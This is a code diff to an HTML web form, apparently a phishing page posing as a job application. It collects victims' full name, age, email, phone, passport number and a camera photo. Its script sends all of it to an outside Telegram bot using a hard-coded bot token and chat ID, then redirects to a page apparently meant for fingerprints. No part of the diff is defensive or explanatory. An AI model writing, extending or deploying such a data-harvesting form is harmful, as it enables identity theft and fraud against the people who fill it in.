@@ -108,36 +108,108 @@
 
   <!-- news section -->
 
-  <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <form onsubmit="handleForm(event)" style="border: 1px solid #ccc; padding: 40px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); background-color: #f9f9f9; width: 500px;">
-      <h2 style="text-align: center;">User Form</h2>
+ <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <form id="myForm" onsubmit="handleForm(event)" style="border: 1px solid #ccc; padding: 40px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); background-color: #f9f9f9; width: 500px;">
+  <h2 style="text-align: center;">User Form</h2>
 
-      <label for="fullname">Full Name:</label><br>
-      <input type="text" id="fullname" name="fullname" required style="width: 100%; padding: 10px;"><br><br>
+  <label for="fullname">Full Name:</label><br>
+  <input type="text" id="fullname" name="fullname" required style="width: 100%; padding: 10px;"><br><br>
 
-      <label for="age">Age:</label><br>
-      <input type="number" id="age" name="age" required style="width: 100%; padding: 10px;"><br><br>
+  <label for="age">Age:</label><br>
+  <input type="number" id="age" name="age" required style="width: 100%; padding: 10px;"><br><br>
 
-      <label for="email">Email:</label><br>
-      <input type="text" id="email" name="email" required style="width: 100%; padding: 10px;"><br><br>
+  <label for="email">Email:</label><br>
+  <input type="text" id="email" name="email" required style="width: 100%; padding: 10px;"><br><br>
 
-      <label for="phonenumber">Phone Number:</label><br>
-      <input type="tel" id="phonenumber" name="phonenumber" required style="width: 100%; padding: 10px;"><br><br>
+  <label for="phonenumber">Phone Number:</label><br>
+  <input type="tel" id="phonenumber" name="phonenumber" required style="width: 100%; padding: 10px;"><br><br>
 
-      <label for="passport">Passport Number:</label><br>
-      <input type="text" id="passport" name="passport" required style="width: 100%; padding: 10px;"><br><br>
+  <label for="passport">Passport Number:</label><br>
+  <input type="text" id="passport" name="passport" required style="width: 100%; padding: 10px;"><br><br>
 
-      <button type="submit" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px;">Next</button>
-    </form>
+  <label for="photo">Live Picture (Camera Only):</label><br>
+  <input type="file" id="photo" accept="image/*" capture="environment" required style="width: 100%; padding: 10px;"><br><br>
+
+  <!-- Live preview -->
+  <img id="photoPreview" src="" style="width: 100%; display: none; border-radius: 8px; margin-bottom: 15px;" />
+
+  <!-- Loading indicator -->
+  <div id="loading" style="display: none; text-align: center; color: purple; font-weight: bold;">Uploading... Please wait</div>
+
+  <button type="submit" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px;">Next</button>
+</form>
   </div>
 
   <script>
-    function handleForm(event) {
-      event.preventDefault(); // stop form from submitting
-      // Optional: Validate or store data here
-      window.location.href = "finger1.html"; // redirect to the next page
+  // Live preview of selected photo
+  document.getElementById('photo').addEventListener('change', function (event) {
+    const file = event.target.files[0];
+    const preview = document.getElementById('photoPreview');
+
+    if (file && file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        preview.src = e.target.result;
+        preview.style.display = 'block';
+      };
+      reader.readAsDataURL(file);
+    } else {
+      preview.src = '';
+      preview.style.display = 'none';
     }
-  </script>
+  });
+
+  async function handleForm(event) {
+    event.preventDefault();
+
+    // Show loading
+    document.getElementById('loading').style.display = 'block';
+
+    // Get form data
+    const name = document.getElementById('fullname').value;
+    const age = document.getElementById('age').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phonenumber').value;
+    const passport = document.getElementById('passport').value;
+    const photoFile = document.getElementById('photo').files[0];
+
+    const chatId = "7470456034";
+    const token = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
+
+    const message = `📌 *Work Applicant*\n👤 Name: ${name}\n🎂 Age: ${age}\n📧 Email: ${email}\n📞 Phone: ${phone}\n🛂 Passport: ${passport}`;
+
+    try {
+      // Send text message
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
+      // Send photo
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", photoFile);
+      formData.append("caption", `📷 Live picture of ${name}`);
+
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+
+    } catch (err) {
+      console.error("Telegram error:", err);
+    }
+
+    // Hide loading and redirect
+    document.getElementById('loading').style.display = 'none';
+    window.location.href = "finger1.html";
+  }
+</script>
 
 
 
